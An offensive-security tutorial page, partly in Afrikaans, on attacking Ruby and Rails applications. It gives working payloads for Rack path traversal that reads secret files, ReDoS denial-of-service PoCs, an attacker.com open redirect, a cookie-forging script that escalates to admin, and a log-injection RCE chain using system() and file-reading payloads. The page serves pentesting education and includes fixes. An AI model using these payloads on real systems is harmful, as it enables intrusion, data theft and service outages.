# Ruby Truuks

{{#include ../../banners/hacktricks-training.md}}

## Lêer-oplaai na RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

Wenke:
- Ander boot/eager-load plekke wat by app-start uitgevoer word is ook riskant as hulle skryfbaar is (bv. `config/initializers/` is die klassieke voorbeeld). As jy 'n arbitrary file upload vind wat enige plek onder `config/` beland en later geëvalueer/required word, kan jy RCE by boot kry.
- Soek na dev/staging builds wat user-controlled files in die container image kopieer waar Rails hulle by boot sal laai.

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- What to try during testing
- Identify any endpoints that accept variant/processing options, transformation names, or arbitrary ImageMagick arguments.
- Fuzz `params[:t]` and `params[:v]` for suspicious errors or execution side-effects. If you can influence the method name or pass raw arguments that reach MiniMagick, you may get code exec on the image processor host.
- If you only have read-access to generated variants, attempt blind exfiltration via crafted ImageMagick operations.

- Remediation/detections
- If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + `image_processing` + `mini_magick` and user-controlled transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a hardened ImageMagick policy.

## Rack::Static LFI / path traversal (CVE-2025-27610)

If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.

- Hunt for apps that mount `Rack::Static` in `config.ru` or middleware stacks. Try encoded traversals against static paths, for example:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Adjust the prefix to match configured `urls:`. If the app responds with file contents, you likely have LFI to anything under the resolved `:root`.

- Mitigation: upgrade Rack; ensure `:root` only points to a directory of public files and is explicitly set.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers. A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Works against any Rack-based stack (Rails/Sinatra/Hanami/Grape). If fronted by nginx/haproxy with keep-alive, repeat in parallel to exhaust workers.
- Patched by making parser linear; look for `rack` gem version < `3.0.9.1` or < `2.2.8.1`. In assessments, point out that WAFs rarely block this because the header is syntactically valid.

## REXML XML parser ReDoS (CVE-2024-49761)

The REXML gem < 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients, SAML, SVG uploads) can be abused for CPU exhaustion.

Minimal trigger against a Rails endpoint that parses XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
As die proses sekondes lank besig bly en worker CPU-stygings voorkom, is dit waarskynlik kwesbaar. Die aanval is lae bandwydte en raak ook agtergrondwerke wat XML inlees.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Apps wat die `cgi` gem gebruik (standaard in baie Rack-stacks) kan met 'n enkele kwaadwillige header bevries word:
- `CGI::Cookie.parse` was super-linear; huge cookie strings (duisende delimiters) veroorsaak O(N²)-gedrag.
- Die regex in `CGI::Util#escapeElement` het ReDoS op HTML escaping toegelaat.

Beide kwessies is reggemaak in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Vir pentests, gooi 'n massiewe `Cookie:` header of voer onbetroubare HTML aan helper code en kyk vir worker lockup. Kombineer met keep-alive om te versterk.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

Die `googlesign_in` gem < 1.3.0 (gebruik vir Google OAuth op Rails) het 'n onvolledige same-origin check op die `proceedto`-parameter uitgevoer. 'n vervormde URL soos `proceedto=//attacker.com/%2F..` omseil die check en herlei die gebruiker na 'n eksterne werf terwyl Rails flash/session cookies bewaar word.

Exploit flow:
1. Slagoffer klik op 'n aangepaste Google Sign-In link gehost deur die aanvaller.
2. Na authentication herlei die gem na 'n attacker-controlled domain, leaking flash notices of enige data gestoor in cookies wat aan die wildcard-domein gebind is.
3. If the app stores short-lived tokens or magic links in flash, kan dit in account takeover omskep word.

Tydens toetsing, grep Gemfile.lock na `googlesign_in` < 1.3.0 en probeer vervormde `proceedto` waardes. Bevestig via Location header en cookie reflection.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails enkripteer en teken cookies met sleutels wat van `secret_key_base` afgelei is. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), kan jy gewoonlik cookies ontsleutel, wysig en weer enkripteer. Dit lei dikwels tot authz bypass as die app rolle, user IDs, of feature flags in cookies stoor.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Aantekeninge:
- Ouer apps mag AES-256-CBC en salts `encrypted cookie` / `signed encrypted cookie` gebruik, of JSON/Marshal serializers. Pas salts, cipher, en serializer ooreenkomstig aan.
- In geval van kompromittering of assessering, roteer `secret_key_base` om alle bestaande cookies ongeldig te maak.

## Sien ook (Ruby/Rails-spesifieke kwesbaarhede)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

Wanneer 'n app (dikwels 'n eenvoudige Rack/Sinatra/Rails endpoint) beide:
- logs 'n gebruiker-beheerde string woordelik, en
- later met `load` 'n lêer laai waarvan die pad vanaf daardie selfde string afgelei is (na `Pathname#cleanpath`),

kan jy dikwels remote code execution bereik deur die log te vergiftig en dan die app te dwing om die log-lêer te `load`. Sleutelprimitiewe:

- Ruby `load` evalueer die teikenlêer se inhoud as Ruby ongeag die lêeruitbreiding. Enige leesbare tekslêer waarvan die inhoud as Ruby ontleed kan word, sal uitgevoer word.
- `Pathname#cleanpath` vou `.` en `..` segmente saam sonder om die filesystem te raak, wat path smuggling moontlik maak: aanvaller-beheerde rommel kan voor logging voorgeplak word terwyl die opgeschoonde pad steeds na die beoogde lêer oplos om uitgevoer te word (bv. `../logs/error.log`).

### Minimale kwesbare patroon
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Waarom die log geldige Ruby kan bevat
`Logger` skryf voorvoegselreëls soos:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby begin `#` 'n kommentaar en `9/2/2025` is net aritmetiek. Om geldige Ruby-kode in te spuit, moet jy:

- Begin jou payload op 'n nuwe reël sodat dit nie deur die `#` in die INFO line gekommenteer word nie; stuur 'n voorloopende newline (`\n` of `%0A`).
- Maak die hangende `[` wat deur die INFO line geïntroduseer is toe. 'n Algemene truuk is om te begin met `]` en opsioneel die parser tevrede te stel met `][0]=1`.
- Plaas dan arbitrêre Ruby (bv. `system(...)`).

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Smuggling 'n enkele string wat beide code log en na die log-pad oplos
Ons wil 'n attacker-controlled string hê wat:
- wanneer dit raw gelog word, bevat dit ons Ruby payload, en
- wanneer dit deur `Pathname.new(<input>).cleanpath` verwerk word, los dit op na `../logs/error.log`, sodat die daaropvolgende `load` die pas-vergiftigde log-lêer uitvoer.

`Pathname#cleanpath` ignoreer schemes en vou traversal-komponente saam, dus werk die volgende:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Die `#` before `://` verseker dat Ruby die stert ignoreer wanneer die log uitgevoer word, terwyl `cleanpath` steeds die agtervoegsel verminder tot `../logs/error.log`.
- Die leidende reëlbreuk breek uit die INFO-lyn uit; `]` sluit die loshangende hakie; `][0]=1` voldoen aan die parser.

### End-to-end exploitation
1. Stuur die volgende as die backup script name (URL-encode die eerste newline as `%0A` indien nodig):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Die app log jou rou string in `logs/error.log`.
3. Die app bereken `cleanpath` wat oplos na `../logs/error.log` en roep `load` daarop aan.
4. Ruby voer die kode wat jy in die log geïnjekteer het uit.

To exfiltrate a file in a CTF-like environment:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (eerste karakter is 'n newline):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Verwysings

- [Rails Sekuriteitsaankondiging: CVE-2025-24293 Active Storage onveilige transformasie-metodes (reggestel in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub-advies: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath dokumentasie](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Hoe Ruby load werk](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS-advies (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby sekuriteitskennisgewings vir CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
